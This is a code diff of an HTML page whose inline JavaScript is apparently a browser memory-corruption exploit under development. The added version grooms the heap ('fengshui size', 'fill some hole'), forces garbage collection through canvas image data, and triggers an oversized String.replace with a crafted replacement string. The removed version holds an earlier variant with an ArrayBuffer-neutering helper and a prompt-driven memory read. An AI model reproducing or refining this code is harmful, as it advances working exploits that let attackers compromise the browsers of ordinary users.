@@ -1,35 +1,18 @@
-<script>
-
-alert("start5");
-function neuter(ab) {
-
-    postMessage("", "*", [ab]);
-
-}
-
+<script>	
+alert("start");
 function gc() {
-
     try {
+        var c = document.createElement("canvas");
+        var gl = c.getContext("2d");
 
-
-
-
-        for (var i = 0; i < 0x2000; i++) {
-
-            var gggg =new Array(0x100);
-
+        for (var i = 0; i < 100; i++) {
+            var gggg = gl.createImageData(1, 0x2000)
         }
-
     } catch (e) {
 
-
-
     }
-
 }
-
 function createStringWithRepeatedChar(c, multiplicity) {
-
     while (c.length < multiplicity)
 
         c += c;
@@ -37,87 +20,29 @@ function createStringWithRepeatedChar(c, multiplicity) {
     return c;
 
 }
-
-var x = "1";
-
-var y = "\u0000";
-
-var tmpy="";
-
-for(var i=0;i<0x50;i++){
-
-    tmpy+="\u0000";
-
-}
-
-var array=new Array(0x100);
-
-var mystr=createStringWithRepeatedChar("M",(1 << 16) );
-
-y = createStringWithRepeatedChar(y,(1 << 16) );
-
-x = createStringWithRepeatedChar(x, 1 << 16);
-
-x+="1";
-
-//y=tmpy+y.substring(0,y.length-0x50);
-
-x.substring(0,5);
-mystr.substring(0,5);
-
-y.substring(0,5);
-mystr=0;
-myfunc();
-/* for(var i=0;i<array.length;i++){
-
-array[i] =createStringWithRepeatedChar("M", 1 << 12);
-
-array[i].substr(0,5);
-
-
-
-}
-
-for(var i=0;i<array.length;i++){
-
-if(i%2){
-
-array[i]=0;
-
-}
-
-}*/
-
-function myfunc(){
-
-//alert("to trigger");
-
 gc();
-
-x.replace(/\d/g, y);
-
+var size = 0x220; //fengshui size
+var multiplicity = size/2;
+multiplicity -= 22;
+multiplicity -= 0x10;
+var c = "\u8000\u0000"
+while (c.length < multiplicity){
+c += c;
+}
+c = c.substring(0, multiplicity);
+var x = "1";
+var getSize = function(size) {return (size-0x14)/2}; //string header size = 0x20
+x = createStringWithRepeatedChar(x, 0x1000000);
+x += '2';
+var y = null;
+var arr = new Array(0x1000);
+var cvs = document.createElement('canvas');
+//fill some hole
+for (var i = 0; i < arr.length; i++) {
+arr[i] = c.fontsize(1);
+}
+var s1 = c.fontsize(1) ;
+x.replace(/\d/g, s1);
 alert("ok");
-
-var a=prompt("addr");
-
-a=a/2;
-
-var b;
-
-for(var i=0;i<0x8;i++){
-
- b+=y.charCodeAt(a+i).toString(16);
-
- b+=" ";
-
-}
-
-alert(b);
-
-alert("end");
-
-}
-
-//setTimeout(myfunc,10000);
 
 </script>
